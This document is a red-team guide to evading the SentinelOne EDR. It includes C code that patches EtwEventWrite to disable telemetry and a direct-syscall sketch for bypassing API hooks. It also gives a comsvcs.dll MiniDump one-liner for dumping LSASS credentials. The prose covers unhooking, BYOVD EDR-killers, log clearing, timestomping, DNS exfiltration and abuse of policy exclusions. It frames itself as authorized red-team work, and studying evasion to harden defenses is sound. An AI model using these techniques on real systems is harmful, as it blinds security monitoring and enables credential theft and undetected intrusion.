1. Introduction
Endpoint Detection and Response (EDR) solutions like SentinelOne are designed to detect and stop malicious activities on endpoints using a combination of static analysis, behavioral monitoring, and threat intelligence. SentinelOne is a leading EDR platform that employs multiple detection engines, including machine-learning based static scans and AI-driven behavioral analysis, to catch threats at different stages.

It hooks into low-level operating system functions and continuously monitors processes for suspicious patterns. For red team operators simulating Advanced Persistent Threats (APTs), these robust defenses mean that stealth and sophisticated evasion are paramount.

1.1 Purpose of this Guide: This guide provides a comprehensive roadmap for red teamers to conduct nation-state level attack simulations on SentinelOne-protected environments. We focus on techniques to evade detection and response mechanisms of SentinelOne, merging knowledge from real-world cases and cutting-edge research. The goal is to help operators understand how SentinelOne works and how to bypass its security controls without raising alerts, all within agreed rules of engagement. Importantly, while this guide discusses how to evade or disable EDR defenses, these techniques should only be used ethically and with proper authorization (e.g. in controlled security assessments). The purpose is to improve red team effectiveness and to help defenders harden against these tactics by understanding them.

1.2 Overview of SentinelOne’s Detection Mechanisms: SentinelOne’s agent uses a combination of static AI (pre-execution file analysis) and behavioral AI (runtime monitoring) to detect threats. Before execution, files can be scanned by machine learning models trained on malware characteristics. During execution, SentinelOne intercepts key API calls and system events via user-mode hooks and kernel callbacks, looking for malicious sequences (e.g., code injection attempts, suspicious process behavior).

The agent can also leverage telemetry like Event Tracing for Windows (ETW) and kernel notifications to catch stealthy techniques. For example, if malware tries to allocate memory in another process and start a remote thread, SentinelOne’s hooks in functions like NtAllocateVirtualMemory and NtCreateThreadEx would normally detect that pattern. SentinelOne also incorporates cloud intelligence and allows custom detection rules (the “STAR” rules) that organizations can define to catch specific behaviors. In essence, the SentinelOne platform casts a wide net across the system: from files on disk, to process API calls, to in-memory telemetry, aiming to stop attacks at multiple points.

1.3 Red Team Strategy for EDR Bypass: From a red team perspective, defeating an EDR like SentinelOne is a cat-and-mouse game. Attackers must employ creative techniques to operate on a target system without triggering the EDR’s detection logic or at least delaying detection long enough to achieve objectives. This often means living off the land (using trusted system tools), executing code only in memory (fileless attacks), and carefully manipulating or unhooking the very OS APIs that EDRs rely on for monitoring. If possible, attackers might also target misconfigurations (like overly broad exclusions) or even vulnerabilities in the EDR software itself. A key philosophy is “If we understand how it watches, we can blind it.” 

For example, knowing that SentinelOne hooks certain functions, we can call those functions in ways that skip the hooks (such as invoking syscalls directly). Or, if SentinelOne trusts a specific signed binary, we can run our payload under the guise of that binary to inherit its trust. A real-world study by security researchers illustrated the cat-and-mouse reality: even top EDRs like SentinelOne, CrowdStrike, etc., only increased the engagement difficulty by roughly 12% (about one extra week of effort) for a red team during a large enterprise compromise. In other words, a skilled attacker can often find a path around the EDR with some additional work. SentinelOne’s goal is to raise the attacker’s required skill and time; the red team’s goal is to adapt and innovate to restore their advantage.

This guide is organized into distinct sections covering specific areas of evasion: from on-endpoint (user-land and kernel) evasion, to network stealth, to persistence and privilege escalation, and more. We include technical deep-dives, tool configuration tips, case studies of known APT tactics, and a final cheat sheet for quick reference. By understanding and practicing these techniques, a red team can simulate the tactics of advanced threat actors (APTs) and help organizations identify gaps in their SentinelOne deployment. The knowledge here also serves to educate defenders on what advanced evasion looks like in practice so they can improve detection for these bypass methods.

Key Content Summary

•	SentinelOne Detection Basics: SentinelOne uses machine-learning static analysis to scan files pre-execution and AI-driven behavioral monitoring at runtime. It hooks many native API calls (e.g., process and memory functions in ntdll.dll) to intercept malicious behavior
•	Understanding these mechanisms allows us to develop bypasses like unhooking APIs or using direct system calls to avoid detection.
•	Userland EDR Evasion Techniques: We explore methods to evade SentinelOne’s user-mode hooks, including loading fresh copies of DLLs and patching out hooks in memory, performing direct syscalls to bypass userland monitoring, and using stealthy injection techniques (process hollowing, “Early Bird” thread injection, etc.) that break the typical patterns SentinelOne looks for. We also cover patching telemetry functions like ETW and AMSI to further reduce detection surface.
•	Kernel-Mode and Advanced Evasion: For high-privilege scenarios, we cover Bring Your Own Vulnerable Driver (BYOVD) attacks to disable or kill the SentinelOne agent from kernel space. We discuss Direct Kernel Object Manipulation (DKOM) and other rootkit-like techniques to hide processes/threads from the EDR. We even touch on hypervisor-level evasion (installing a malicious hypervisor beneath the OS) for completeness, though these are mostly theoretical for red teams.
•	Network and Lateral Movement Stealth: SentinelOne primarily focuses on host behavior, but we also address evading network detections during operations. This includes using encrypted channels and protocol mimicry for C2, domain fronting, DNS tunneling, and other covert channels to blend in with normal traffic. For lateral movement, we discuss how to use legitimate admin tools (WMI, WinRM, PsExec, etc.) in stealthy ways to avoid triggering SentinelOne’s lateral movement heuristics.
•	Threat Hunting Evasion & Anti-Forensics: We emphasize covering tracks: securely deleting or hiding any tools or outputs to evade forensic collection, tampering with or disabling event logging where possible, and avoiding obvious “Indicators of Compromise” in command usage (e.g., no plain powershell -Enc commands)
•	This section covers anti-forensic techniques like timestomping, clearing logs, and even feeding false data to EDR if access allows.
•	SentinelOne-Specific Bypasses: SentinelOne has unique features (like Storyline context, device control, and cloud-query capabilities). We cover abusing policy misconfigurations (if SentinelOne is in detect-only mode or has exclusions), leveraging older agent versions or known vulnerabilities (e.g., the 2022 Aikido vulnerability that allowed attackers to turn the SentinelOne agent into a wiper and delete protected files), and even using SentinelOne’s own management API or local client interfaces to disable protection if credentials or access can be obtained.
•	Persistence & Privilege Escalation: We outline stealthy ways to persist on a machine (like registry run keys that piggyback on legitimate processes, WMI event consumers as used by APT29, or DLL sideloading into trusted apps). For privilege escalation, techniques such as token stealing, exploiting vulnerable drivers (to get kernel code execution), and dumping credentials (LSASS) after disabling hooks are detailed. We discuss how to dump LSASS memory using methods that appear legitimate (e.g. using Microsoft’s own comsvcs.dll MiniDump function) to avoid SentinelOne’s usual alarms.
•	Command-and-Control (C2) and Exfiltration: Maintaining stealthy C2 is crucial. We cover using custom profiles for Cobalt Strike (to avoid known Beacon patterns), leveraging less common C2 frameworks (or custom implants) that SentinelOne hasn’t seen, and configuring long sleep/jitter to avoid network analytics. For exfiltration, we talk about chunking data and using innocuous channels like DNS requestsor uploading to trusted cloud services (OneDrive, AWS S3) so that large data transfers look normal. All exfil is encrypted and camouflaged to evade any content inspection or DLP.
•	Operational Security (OPSEC) and Real Case Studies: Throughout the guide, we include case studies such as FIN7’s AvNeutralizer (aka AuKill) tool that was sold on dark markets to kill EDR processes (including SentinelOne), and the 2023 “Terminator/Spyboy” EDR-killer that used a vulnerable driver to shut down security software. These illustrate how real attackers approach EDR evasion. We highlight OPSEC lessons (e.g., FIN7 had to continually update their tool as EDRs adapted). We also discuss red team failure examples—like a team getting caught by SentinelOne due to using an unmodified Cobalt Strike beacon, or triggering SentinelOne’s tampering alerts by trying to kill the agent ungracefully—to underscore what not to do.
•	Modular & Custom Tooling: A section is devoted to automation and tooling, showing how to integrate these evasion techniques into your implants and scripts. This includes using PowerShell or Python to automate the unhooking of APIs on each new host, using C2 framework extensions (e.g., Beacon Object Files in Cobalt Strike) to disable EDR as part of your post-exploitation workflow, and continuous integration practices to compile payloads with unique signatures (to avoid SentinelOne’s hash/heuristic detections).
•	Quick Reference Cheat Sheet: At the end, we provide a cheat sheet that condenses the above strategies into a step-by-step execution flow for an operator, including specific one-liner code snippets for common tasks (unhooking, ETW disabling, dumping credentials, DNS exfiltration, etc.) and guidance on setting up and compiling the necessary tools.

2. Endpoint Detection & Evasion
   
SentinelOne’s endpoint agent employs both static and behavioral AI detection mechanisms to guard against malicious code execution. Understanding these mechanisms is key to formulating bypass techniques:

Static AI Detection: Before execution, SentinelOne will inspect executable files using machine-learning classifiers trained on malware vs. benign features. This can catch known malware or suspicious file attributes on-disk. Evasion: Red teams often bypass static scanning by using fileless techniques (e.g. injecting shellcode directly into memory or executing code via script interpreters and LOLBins) so that no obviously malicious file ever hits the disk. If a payload must be written to disk, packing or polymorphic alterations can help it appear benign. Another tactic is process ghosting/herpaderping, where a process image is modified or deleted after the SentinelOne scan but before execution, thereby executing code that wasn’t scanned by the static engine (though these techniques require careful timing).

Behavioral AI Detection: During runtime, SentinelOne’s agent monitors processes for suspicious behavior. It does this by intercepting key API calls and Windows internals – for example, calls that allocate memory, inject threads, or read/write other processes’ memory are hooked and analyzed. The agent’s behavioral engine looks for patterns of malicious activity (sequence of API calls, anomalies like a trusted process spawning a rogue thread, etc.) and uses AI models plus heuristic rules to decide if the behavior is malicious. It also leverages telemetry like kernel callbacks or Event Tracing (ETW) to watch for things like code injection into live processes, reflective DLL loads, or tampering with the OS. 

Evasion: To bypass these behavioral checks, attackers use techniques such as:

•	Direct System Calls: Instead of calling high-level Windows API functions (which are hooked by SentinelOne’s user-mode agent), malware can invoke system calls directly. By executing the CPU-level syscall instruction to call kernel services, attackers circumvent the user-land hooks that EDRs like SentinelOne rely on. This allows malicious code (e.g. creating a remote thread or allocating memory in another process) to execute without the EDR seeing the usual API call – effectively blinding the behavioral engine. In fact, researchers showed that popular EDRs (Microsoft, Symantec, SentinelOne) could be bypassed by directly calling the kernel, evading their hook functions.

•	Unhooking API Hooks: Another approach is to remove or bypass the hooks that the SentinelOne agent has placed in process memory. For example, the agent hooks dozens of ntdll.dll routines (like NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx, etc.) that are commonly used for malicious injections. A red teamer can load a fresh copy of the legitimate ntdll.dll from disk and overwrite the in-memory hooked functions with the original bytes, or simply patch the hook jump instructions with no-ops. This effectively restores the original API behavior so the EDR’s code is no longer invoked on those calls. Once unhooked, the malware can perform formerly high-risk actions (like dumping LSASS memory or injecting into another process) without SentinelOne intercepting those API calls. For example, Cylance’s EDR hook on NtReadVirtualMemory was removed by patching the first 5 bytes to their original values, after which dumping LSASS via MiniDumpWriteDump succeeded with no alert. The same concept applies to SentinelOne’s hooks.

•	Using Hooked Functions’ Fragments: A more advanced evasion is to execute around the hooks. Researchers found that by leveraging fragments of the hooked function’s code that are not covered by the hook, they could still perform the desired action without activating the hook trigger. In practice, this might mean jumping into the middle of an API function after the EDR’s trampoline, or calling subroutines within the function that achieve the same result. This technique effectively prevents the hook from ever firing and was shown to bypass multiple EDR products without raising alarms (though this is a complex approach more common in malware than manual red team ops).

•	Memory Injection Tactics: Since direct injection via standard APIs (VirtualAllocEx, WriteProcessMemory, CreateRemoteThread) will be caught by hooks, attackers have developed stealthier injection methods. These include process hollowing (starting a benign process then replacing its memory) and DLL injection via less obvious paths (e.g. using NtMapViewOfSection to map malicious code into a remote process). SentinelOne monitors many of these methods, but clever twists can evade detection. For instance, Early Bird injection queues malicious code in a thread before the thread starts, or Thread Doppelgänging creates a suspended process and swaps its execution context – these subvert the usual sequence of API calls that EDRs look for. The key is to break or reorder the typical patterns that the behavioral AI flags. Direct syscalls or unhooking, as discussed, often facilitate these techniques by eliminating the agent’s insight into the process.

•	Process Whitelisting Abuse: SentinelOne’s agent also has an Application Control component that can trust or whitelist certain signed binaries or processes. Adversaries take advantage of this by executing malicious code under the guise of a trusted application. For example, one can use LOLBins (“Living off the Land” binaries – legitimate Windows binaries that are often whitelisted) to execute payloads. If SentinelOne is configured to allow PowerShell or MSBuild for IT scripts, a red teamer can smuggle malicious instructions through those binaries. Similarly, if an organization has policy exclusions (e.g. a specific software directory or process name is excluded from scanning), running payloads from that location or as that process can evade SentinelOne. Masquerading is another angle: rename your tool to mimic a known benign process or digitally sign it with a certificate that SentinelOne trusts. Abuse of trust relationships – such as injecting into a process that is by policy allowed to load uncertified code – falls in this category. Essentially, any gap in the whitelist or policy can be an open door. (It’s worth noting that abusing whitelisted processes is a double-edged sword: those processes might still produce unusual telemetry when misused, potentially caught by behavioral anomaly detection.)

Practical Endpoint Evasion Demo – Direct Syscall: The following snippet illustrates the concept of bypassing user-land hooks by invoking a system call directly. In this C example, instead of calling VirtualAllocEx (which is hooked), we manually retrieve the NtAllocateVirtualMemory syscall number from ntdll and execute it. This avoids the EDR hook and allocates memory in a target process without SentinelOne’s user-mode agent noticing:
```
// Example: Direct syscall for NtAllocateVirtualMemory (x64 Windows)
#include <windows.h>
#include <stdio.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *NtAllocMem)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG  AllocationType,
    ULONG  Protect);

int main() {
    // Get pointer to NtAllocateVirtualMemory in loaded ntdll
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    NtAllocMem pNtAllocateVirtualMemory = (NtAllocMem)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    // Retrieve the syscall ID from the function’s first bytes
    // (For illustration, assume we extracted it as 'syscallId')
    DWORD syscallId = 0x18;  // Example ID

    // Prepare arguments for the syscall (allocate 0x1000 bytes in current process)
    PVOID baseAddr = NULL;
    SIZE_T size = 0x1000;
    HANDLE proc = GetCurrentProcess();

    // Inline assembly to invoke the syscall (Windows x64 calling convention)
    // Note: In 64-bit, inline asm in MSVC is not allowed, so pseudo-code for clarity
    __asm {
        mov r10, rcx        ; move current process handle to r10 (per syscall convention)
        mov eax, syscallId  ; move service number into eax
        syscall             ; trigger system call
        // After syscall, NTSTATUS is in rax
    }

    printf("Syscall returned 0x%X\n", (unsigned)GetLastError());
    return 0;
}
```
Explanation: The above code sketches how one would execute a syscall to allocate memory without calling the normal Windows API (which would be hooked by SentinelOne). Tools like Hell’s Gate/TartarusGate automate resolving syscall numbers and invoking them from user-mode. By using such techniques, red team tools can perform actions (allocating memory, opening processes, etc.) while completely bypassing SentinelOne’s user-mode interception. This is the basis of many modern EDR evasion frameworks.

3. Network Evasion & Lateral Movement
   
Beyond host-based sensors, red team operators must consider network detections. SentinelOne primarily focuses on endpoint behavior, but in an enterprise it often feeds alerts to a SOC alongside network-based detectors (IDS/IPS). Moreover, SentinelOne’s agent itself has a Lateral Movement Detection feature that watches for suspicious network-driven behavior on the host. This section covers how to evade detection when performing network communications and lateral movement (moving from one compromised host to another).

IDS/IPS Evasion Techniques: If the red team’s traffic crosses network monitoring, tactics like encryption and protocol mimicry are essential. Always use encrypted channels (HTTPS/TLS, SMB encryption, etc.) for command-and-control (C2) and data exfiltration to prevent simple signature detection. Employ domain fronting or route C2 through well-known domains (e.g. using a cloud provider’s CDN as a front) to blend in with normal traffic. When sending payloads or tools over the network, consider chunking or timing the transfers to avoid abnormal bursts. For example, uploading data in small pieces over a period of time (or over DNS queries) can slip past data volume thresholds. Many adversaries use covert channels like DNS tunneling or even idle protocols (ICMP, HTTP requests that look like web API calls, etc.) to hide their traffic. The key is to make malicious traffic look indistinguishable from legitimate traffic. Using common ports (443, 53) and mimicking expected patterns (web browsing, DNS queries) greatly reduces the chances of triggering network alerts.

Covert Channels (DNS, etc.): DNS tunneling is a popular choice for stealth exfiltration because DNS traffic is ubiquitous and often less scrutinized. An attacker can encode data in DNS query subdomains and use a controlled nameserver to receive it. Similarly, HTTP/S can be used with innocuous-looking requests to exchange data with a C2. OPSEC tip: ensure the user-agent strings and packet timings mimic normal client software. For instance, make your HTTP C2 client identify as a common browser or system update process. Tools like Cobalt Strike’s Malleable C2 profiles allow fine-tuning of network indicators to evade detection. If possible, piggyback on an existing allowed connection – e.g. injecting a backdoor into a process that already has network access (like a web browser or update service) so that your C2 traffic appears to originate from that process (which SentinelOne or firewall policies might consider benign). Some advanced implants use legitimate cloud services (OneDrive, Google Sheets, etc.) for C2, which is very hard to distinguish from normal user traffic.

Lateral Movement Evasion: Lateral movement often involves techniques like SMB file sharing, WMI/WinRM execution, Remote Desktop (RDP), or stolen token reuse (pass-the-hash/ticket). SentinelOne’s agent has a feature to detect lateral movement by monitoring for unusual use of these methods. For example, if a host suddenly starts invoking WMI or WinRM to spawn processes on many other machines, that’s a red flag. To evade this, red teamers use living-off-the-land approaches: leverage built-in administrative tools in ways that blend with IT activity. For instance, using wmic.exe or PowerShell Remoting (WinRM) with valid admin credentials might be less suspicious if done in a manner consistent with sysadmin behavior (limited scope, during maintenance windows, etc.). Another method is to exploit software vulnerabilities for lateral movement (e.g. EternalBlue SMB exploit) – this can bypass credential-based monitoring, but note that dropping an exploit or malware on the target might itself be caught by SentinelOne unless done carefully. When using remote execution, prefer methods that don’t leave obvious traces: for example, schedule a task remotely or use sc.exe to create a service on the target (then delete it after use). These actions might still be logged, but they appear as legitimate Windows functions rather than an unknown binary running. 

Pass-the-Hash/Ticket: If you’ve stolen credentials (perhaps by dumping memory after evading SentinelOne), use them with native protocols (SMB, Kerberos) rather than launching new malware on each target. Authenticating with a legitimate account to move laterally will look like normal admin access unless the account usage is wildly out of the ordinary.

Blending with Normal Admin Traffic: Many organizations regularly use RDP, remote PowerShell, or management tools – the difference between an attacker and an admin is context. Red teams should carefully choose which accounts and machines to move laterally with. Using an established IT jump server as the pivot can make your actions vanish in the noise of normal operations. Also consider lateral movement via less-monitored protocols: e.g., if RDP and WMI are heavily watched by SentinelOne or SIEM rules, something like Distributed COM (DCOM) or Remote Registry might not be. However, each method can have its own artifacts, so always clean up after moving (clear any created scheduled tasks, remove any temporary files or created local accounts). If SentinelOne’s agent is present on the next host, the evasion techniques from this guide need to be applied there as well – sometimes an initial compromise is used to push out an EDR bypass (like a script or tool to disable SentinelOne) to a target host before deploying the main payload on that host. For instance, using valid credentials to log onto a server and then using a trusted admin tool to unload or tamper with the SentinelOne agent (if policy allows) can clear the way for post-exploitation on that server.

In summary, network evasion is about hiding in normal traffic, and lateral movement evasion is about acting like a legitimate admin. By using native tools, proper timing, and stealthy C2 channels, a red team can traverse a SentinelOne-protected network without raising immediate alarms. SentinelOne’s own documentation notes that fileless techniques and misuse of admin tools make lateral movement stealthy and hard to detect (which is exactly what attackers capitalize on).

5. Threat Hunting Evasion
   
Modern EDRs like SentinelOne not only attempt to block attacks in real-time, but also facilitate threat hunting by recording extensive telemetry (process creation, file modifications, memory anomalies, etc.) for later analysis. SentinelOne’s console (and its Deep Visibility/STAR query feature) allows defenders to search across endpoints for suspicious artifacts. A savvy red team must assume that even if their activity isn’t blocked, it may be logged for an analyst to find. Thus, evasion extends to hiding from forensic examination and threat hunting. Key techniques include:

•	Log and Event Artifact Manipulation: Whenever possible, clean up or interfere with security logs that could reveal your activities. This includes Windows Event Logs (e.g., Security, Sysmon, PowerShell logs) as well as any logs that SentinelOne might use. Be cautious: SentinelOne itself stores activity data in its agent and sends telemetry to a cloud server; you may not be able to wipe those without tampering with the agent (which might raise an alert). However, basic anti-forensics like clearing Windows event logs with wevtutil or truncating log files can remove evidence that might trigger an investigation. If you have SYSTEM privileges, you could consider stopping the Windows Event Log service briefly (or using a tool to suspend it) while performing certain actions, then restarting it – though this itself might be noticed if logs suddenly have a gap. Another trick is timestamp manipulation: “backdating” files or using tools to alter $MFT entries so that any files you create (including those the agent might flag) look older or benign. Attackers sometimes modify or delete application logs (e.g. SQL Server logs if they used xp_cmdshell) to hide lateral movement.

•	EDR Telemetry Interference: Some open-source tools like EDRSandblast and EDRSilencer take a more direct approach by targeting the EDR’s telemetry capabilities. For example, EDRSilencer uses the Windows Filtering Platform to block the agent’s outbound communication, preventing it from sending alerts to the server. Similarly, tools can remove or disable kernel callbacks that EDR agents register (for process/thread/image events). In fact, one technique is to use Direct Kernel Object Manipulation (DKOM) to unlink or toggle the callback registrations for SentinelOne (essentially making the OS ignore the agent). The open-source EDRSandblast tool demonstrates this by zeroing out the callback function pointers or marking them as not enabled. With callbacks disabled, SentinelOne won’t receive notifications for process starts or other events – significantly blinding its visibility. Red teamers with kernel access (via a driver exploit or BYOVD) could perform such tricks manually as well. Another telemetry to consider is ETW (Event Tracing for Windows): some EDRs utilize ETW providers to get kernel events or even user-land .NET events. It’s possible to patch functions like EtwEventWrite in your process to quietly disable event reporting (a known AV/EDR evasion tactic). For instance, patching EtwEventWrite to simply return (no-op) can prevent an EDR from receiving telemetry about your actions in that process. The snippet below demonstrates this concept:

```
// C code to disable ETW events in the current process (x64)
#include <windows.h>
#include <stdio.h>

int main(){
    // Get address of EtwEventWrite in ntdll
    void *etwAddr = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
    if(etwAddr == NULL) return 1;
    // Overwrite first byte with a ret (0xC3) to stub it out
    DWORD oldProtect;
    VirtualProtect(etwAddr, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    *(BYTE*)etwAddr = 0xC3;
    VirtualProtect(etwAddr, 1, oldProtect, &oldProtect);
    printf("ETW patch applied.\n");
    // Now any ETW events from this process are blocked.
    // ... proceed with malicious actions ...
    return 0;
}
```
Explanation: This code disables ETW tracing for the current process by patching the function that writes events. If SentinelOne relies on ETW for certain telemetry, this prevents those events from ever being recorded. Combined with unhooking, this makes the process much “quieter” from the EDR’s perspective.

•	Avoiding Query Triggers: Threat hunters often use sweeping queries (via SentinelOne’s Deep Visibility or a SIEM) to find suspicious indicators – e.g. searching for processes with unusual parent-child relationships or looking for specific strings in command-line arguments. As a red team operator, anticipate these and avoid obvious indicators. For instance, don’t run powershell.exe -Enc <base64> (the well-known encoded command flag); instead, use more subtle PowerShell usage or embed commands in scripts that look innocuous. Avoid common hacker tool names in your binaries or scripts – e.g., rename your Mimikatz binary to something mundane like sysdiag.dll. 

Use staged execution to hide intent: instead of one big one-liner that performs multiple malicious actions (which, if caught in logs, reveals the whole plot), break your steps into multiple smaller actions that each appear harmless (e.g. first create a scheduled task with a benign name, later that task triggers your payload). Also encrypt or encode payloads and configs so that even if they are recorded in memory or disk, an analyst can’t easily identify them. Some attackers even hook or patch EDR user-land query interfaces – for example, if the SentinelOne agent exposes a local CLI or API to query its data, an attacker could attempt to tamper with that. (This is less common, but in principle if you compromise an endpoint, you could alter the data that the agent reports or queries locally, for instance feeding it bogus info or clearing its local event buffer.)

•	Anti-Forensics on Filesystem: If you had to drop any tools or payloads to disk, ensure you delete them securely after use. Consider using in-memory techniques for everything (there are frameworks to reflectively load EXEs/DLLs into memory from a script). Where files must exist (e.g. a dump file or data to exfil), store them in locations that blue teamers are less likely to check (not in C:\Temp\ with a weird name, but perhaps in C:\ProgramData\Microsoft\Windows\ under a plausible folder name). Alternatively, encrypt and hide these artifacts: for example, stash data in NTFS Alternate Data Streams of a legitimate file, or use steganography (hiding data within images if you can drop an image file). If time permits, manually edit forensic artifacts: change file names, remove your user account from file ACLs, etc., to confuse the picture. Remember that SentinelOne’s agent might take snapshots of certain behaviors (its “Storyline” feature recording sequences of events). You cannot change what was already sent to the console, but you can try to ensure nothing incriminating remains on the endpoint for an investigator to find in a live response or post-incident forensic review.

In summary, evading threat hunting is about covering tracks and blending in. Use tools that are normally present (so their execution doesn’t stand out), leave as little trace as possible, and if you must leave traces, make them look normal. The objective is that even if defenders pour through logs and EDR telemetry later, they struggle to distinguish your activity from the noise of everyday operations.

5. SentinelOne-Specific Bypass Techniques
   
While the above sections covered general EDR evasion, operators targeting SentinelOne specifically can benefit from knowing its unique features and potential weaknesses. This section focuses on tricks and exploits tailored to SentinelOne’s platform.

Understanding SentinelOne Detection: SentinelOne’s agent is known for aggressively detecting common hacker tools and techniques. For instance, it has behavioral AI models that can detect Cobalt Strike beacons and other frameworks by their runtime patterns. It also has a cloud intelligence feed and custom detection rules (“STAR rules”) that organizations can write themselves. Red teamers should assume SentinelOne will detect off-the-shelf tradecraft: public tools, unmodified malware code, and obvious attack techniques (like Mimikatz or brute-force credential dumping) are often flagged immediately. Indeed, SentinelOne has demonstrated detection of unmodified Cobalt Strike and Brute Ratel payloads. 

Bypass approach: Custom compile or obfuscate your tools. Recompile open-source implants with modifications, use payload generators that insert junk code, and encrypt strings or configs. Essentially, avoid using payloads that match SentinelOne’s known threat indicators. For example, FIN7’s AvNeutralizer tool was a custom EDR killer specifically designed to evade detection by endpoint security including SentinelOne– it repeatedly updated with new tampering methods to stay ahead of detections. This shows the value of custom tooling: tailor your implants and EDR-disablement tools so SentinelOne doesn’t recognize them.

Policy Misconfigurations & Exploitation: Sometimes the weakest link is not the technology but how it’s configured. If the target organization has misconfigured SentinelOne, a red team can exploit that. 
Examples:

•	Detection Only Mode: If SentinelOne is running in a passive mode (not actively killing threats, just alerting), an operator can be noisier and then delete or persist before any human notices. Always test if obvious malware (e.g. EICAR or a simple Meterpreter) is blocked or not – if not, you might have free rein (though assume logs are still being collected).

•	Exclusions: Companies often exclude certain paths or processes from EDR scanning (for performance or compatibility reasons). These might be visible in the agent configuration or obtainable if you have access to the management console (perhaps via leaked or phished admin creds). If you find that, say, C:\DeveloperTools\ is excluded, you can drop your tools there or even rename your malicious EXE to one of the excluded process names. Abusing such trust can let you operate without SentinelOne peering in. Note: Make sure the exclusion is what you think – some exclusions only disable certain detection engines, not everything.

•	Disabled Features: SentinelOne has optional features like script anti-malware (for PowerShell, etc.), device control, firewall control, etc. If some are disabled (which you might infer from system behavior, documentation, or console info), you can leverage that. For instance, if PowerShell-specific monitoring is turned down, you can use PowerShell more freely for post-exploitation (though still be mindful of script logging).

•	Older Agent Versions: Not exactly a misconfiguration, but if the environment uses an outdated SentinelOne agent, it may lack newer detections or have known vulnerabilities. Always check the agent version – older versions might not detect newer techniques or could be susceptible to public exploits. (We discuss exploiting agent vulnerabilities next.)

Exploiting the SentinelOne Agent: EDR software runs with high privileges, so any flaw in it is a potential goldmine for attackers. In the past, SentinelOne (like others) has had vulnerabilities. For example, a 2022 vulnerability in SentinelOne’s Windows agent (as used in SonicWall’s Capture Client) allowed local privilege escalation and arbitrary file deletion, which could let an attacker kill any file, including system or SentinelOne files. The exploit leveraged the agent (running as SYSTEM) to delete chosen files, and was confirmed to affect multiple EDR products including SentinelOne. With such a bug, a red team could delete critical SentinelOne components or system files to disable security or even cause a denial-of-service. When planning an engagement, research if the target’s SentinelOne version has public CVEs – exploiting an EDR’s own vulnerability to uninstall or incapacitate it is the ultimate bypass. As another example, attackers have abused legitimate kernel drivers that come with SentinelOne or related software if any were vulnerable – though SentinelOne has strong self-protection, this is always a possibility.

Custom Malicious Policies via API: SentinelOne offers APIs for management – e.g., to set agent policies, add exclusions, or mark items as benign. If an attacker attains valid API credentials or access to the SentinelOne management console (through social engineering or by compromising an admin account), they can effectively turn the tables. One could push a policy update to put agents into detect-only mode, or add the hash of the red team’s tools to an allowlist. There have been real cases where admin credentials were used by attackers to disable security tools – one Reddit thread suggests an admin account was abused to bypass SentinelOne’s protections. (For a red team, this scenario is usually out of scope unless explicitly allowed, but it’s worth noting as a method of last resort.)

7. Privilege Escalation & Persistence

Once initial access is achieved on a SentinelOne-protected host, the next steps for an operator are often to elevate privileges (ideally to SYSTEM or Domain Admin) and establish persistence, all while dodging the watchful eye of the EDR. This section covers methods to achieve those goals safely.
Exploiting Vulnerable Drivers (BYOVD): As mentioned earlier, Bring Your Own Vulnerable Driver (BYOVD) is a powerful technique. The attacker drops a legitimately signed but vulnerable driver on the system and loads it, then exploits that driver to execute code in kernel mode. Because the driver is signed, SentinelOne (and the OS) will allow it to load; once in kernel, the attacker can do almost anything, including disabling or killing security software. For example, the Terminator/Spyboy toolkit (an “EDR killer”) deploys an old vulnerable Zemana anti-malware driver to achieve kernel execution, then uses it to terminate security processes including SentinelOne’s agent. By operating in kernel space, it bypasses OS-imposed protections on SentinelOne processes (which run as protected processes) and simply kills them off, completely disabling the EDR. 

In a red team scenario, if you can run code as admin, you could use a tool like DrvLoader or built-in OS mechanisms to load a vulnerable driver (there are public lists of known vulnerable drivers). Once loaded, either use an existing exploit for that driver or leverage a ready-made BYOVD tool (many are available) to do the dirty work of killing AV/EDR processes. Caution: Loading a driver will likely trigger an alert (Windows event log for driver load, and SentinelOne may flag known malicious driver hashes). Use drivers that aren’t obviously malicious – some attackers have even abused Microsoft-signed drivers(e.g. the Poortry and Stonestop malware, which are part of toolkits that can shut down security processes). Also, be mindful of system stability; kernel mistakes can crash the host.

Token Manipulation & Credential Dumping: To move from a regular user to higher privileges, token stealing is a common tactic. If you’ve already unhooked APIs, you can try stealing a token from a privileged process (like SYSTEM’s token from winlogon.exe). This typically involves opening a handle to the process and using OpenProcessToken and ImpersonateLoggedOnUser, or adjusting your own process token with SetThreadToken. SentinelOne might detect obvious token theft attempts if done via standard APIs (since those calls can be hooked or produce logs). Using direct syscalls for these token functions or leveraging existing OS functionality (like schtasks /RUN to run something as SYSTEM) can slip by. For instance, one could use PsExec with the -s (System) flag if it’s available (though tools like PsExec are often flagged by EDRs).

Once elevated, credential dumping is a prime objective (e.g. dumping SAM hashes or LSASS memory for cleartext passwords). But dumping LSASS is one of the highest-alert activities – SentinelOne will normally nuke any process that tries to read LSASS memory in a suspicious way. To bypass this, use the evasion techniques from Section 2 before attempting the dump (e.g. unhooking and direct syscalls). A known bypass for LSASS dumping is using Microsoft’s own tooling: e.g., rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> <dumpfile> – this is a Microsoft-signed way to dump LSASS. If unhooking worked, SentinelOne may not stop it. Ensure to do this as SYSTEM and immediately secure the dump file (encrypt it, move it to an uncommon path). Also, dumping via a tool like ProcDump can succeed if you unhook the APIs that it uses (as shown in the Cylance bypass case). Always avoid leaving the dump on disk in the clear – if you get LSASS memory, encrypt or exfiltrate it quickly, then delete it. Another trick: many EDRs look for the string "mimikatz" or known patterns in memory – using a modified build or custom dumper is necessary. Even just renaming strings and function names in your dumper can sometimes get past static rules.

